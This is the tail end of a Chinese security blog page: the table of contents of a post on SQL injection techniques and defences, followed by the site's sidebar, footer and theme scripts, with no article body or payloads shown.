href="#%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.5.6.</span> <span class="toc-text">利用SQL注入执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x3D-x3D-SQL%E6%B3%A8%E5%85%A5%E5%86%99webshel-x3D-x3D"><span class="toc-number">1.5.7.</span> <span class="toc-text">&#x3D;&#x3D;SQL注入写webshel&#x3D;&#x3D;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0webshell%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">上传webshell文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E9%9A%94%E7%AC%A6%E5%86%99%E5%85%A5"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">利用分隔符写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5"><span class="toc-number">1.5.7.3.</span> <span class="toc-text">利用日志写入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6"><span class="toc-number">1.6.</span> <span class="toc-text">6. SQL注入进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x3D-x3D-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-x3D-x3D"><span class="toc-number">1.6.1.</span> <span class="toc-text">&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.2.</span> <span class="toc-text">加解密编码注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%88%E7%BB%95%E8%BF%87%E8%BD%AC%E4%B9%89%EF%BC%89"><span class="toc-number">1.6.3.</span> <span class="toc-text">二次注入（绕过转义）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#load-file-amp-DNSlog%E6%B3%A8%E5%85%A5%EF%BC%88%E8%A7%A3%E5%86%B3%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-number">1.6.4.</span> <span class="toc-text">load_file&amp;DNSlog注入（解决无回显）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88%E7%BB%95%E8%BF%87%E8%BD%AC%E4%B9%89%EF%BC%89"><span class="toc-number">1.6.5.</span> <span class="toc-text">宽字节注入（绕过转义）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XFF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.6.</span> <span class="toc-text">XFF注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.7.</span> <span class="toc-text">7. SQL注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E7%85%A7%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">1.7.1.</span> <span class="toc-text">按照注入方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5%E5%92%8C%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">普通注入和盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84SQL%E7%9B%B2%E6%B3%A8%EF%BC%88%E4%BC%98%E5%85%88%EF%BC%89"><span class="toc-number">1.7.1.2.</span> <span class="toc-text">基于报错的SQL盲注（优先）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84SQL%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%85%B6%E6%AC%A1%EF%BC%89"><span class="toc-number">1.7.1.3.</span> <span class="toc-text">基于布尔的SQL盲注（其次）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84SQL%E7%9B%B2%E6%B3%A8%EF%BC%88%E6%9C%80%E5%90%8E%E8%80%83%E8%99%91%EF%BC%89"><span class="toc-number">1.7.1.4.</span> <span class="toc-text">基于时间的SQL盲注（最后考虑）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E7%85%A7%E6%B3%A8%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.7.2.</span> <span class="toc-text">按照注入的数据类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">字符型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B"><span class="toc-number">1.7.2.3.</span> <span class="toc-text">搜索型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E7%85%A7%E6%8F%90%E4%BA%A4%E5%8F%82%E6%95%B0%E6%96%B9%E5%BC%8F"><span class="toc-number">1.7.3.</span> <span class="toc-text">按照提交参数方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#get%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">get数据注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#post%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.3.2.</span> <span class="toc-text">post数据注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.3.3.</span> <span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#request%E8%AF%B7%E6%B1%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.3.4.</span> <span class="toc-text">request请求注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SERVER%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.3.5.</span> <span class="toc-text">$_SERVER注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#json%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.3.6.</span> <span class="toc-text">json数据注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP%E5%A4%B4%E9%83%A8%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.3.7.</span> <span class="toc-text">HTTP头部参数注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text">8. 各种数据库注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#access%E6%B3%A8%E5%85%A5%EF%BC%88%E6%9A%B4%E5%8A%9B%EF%BC%89"><span class="toc-number">1.8.1.</span> <span class="toc-text">access注入（暴力）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msSQL%E6%B3%A8%E5%85%A5%EF%BC%88pangolin%E7%A9%BF%E5%B1%B1%E7%94%B2%EF%BC%89"><span class="toc-number">1.8.2.</span> <span class="toc-text">msSQL注入（pangolin穿山甲）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postgreSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.3.</span> <span class="toc-text">postgreSQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.4.</span> <span class="toc-text">Oracle注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mongoDB%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.5.</span> <span class="toc-text">mongoDB注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-sqlmap"><span class="toc-number">1.9.</span> <span class="toc-text">9. sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.9.1.</span> <span class="toc-text">get数据注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.9.2.</span> <span class="toc-text">post数据注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4"><span class="toc-number">1.10.</span> <span class="toc-text">8. SQL注入防护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89"><span class="toc-number">1.10.1.</span> <span class="toc-text">字符转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="toc-number">1.10.2.</span> <span class="toc-text">整数过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.10.3.</span> <span class="toc-text">过滤关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#waf%E9%98%B2%E6%8A%A4%E8%BD%AF%E4%BB%B6"><span class="toc-number">1.10.4.</span> <span class="toc-text">waf防护软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E9%A2%84%E7%BC%96%E8%AF%91PDO"><span class="toc-number">1.10.5.</span> <span class="toc-text">使用预编译PDO</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/hello-world" title="Hello World">Hello World</a><time datetime="2023-10-05T11:40:46.695Z" title="Created 2023-10-05 19:40:46">2023-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93" title="渗透测试全流程">渗透测试全流程</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86" title="基础概念与信息收集">基础概念与信息收集</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87" title="SQL注入-WAF绕过">SQL注入-WAF绕过</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.%20XXE%E6%BC%8F%E6%B4%9E" title="XXE">XXE</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2023 By <a class="footer-bar-link" href="/" title="ccb" target="_blank">ccb</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">40</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/DVWA%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">DVWA靶场<sup>10</sup></a><a href="/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/" style="font-size: 0.88rem;">实训-网络建设部分<sup>7</sup></a><a href="/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" style="font-size: 0.88rem;">搭建博客<sup>1</sup></a><a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">机器学习<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>15</sup></a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">计算机基础<sup>5</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.8",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 ccb 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "visitor@anheyu.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>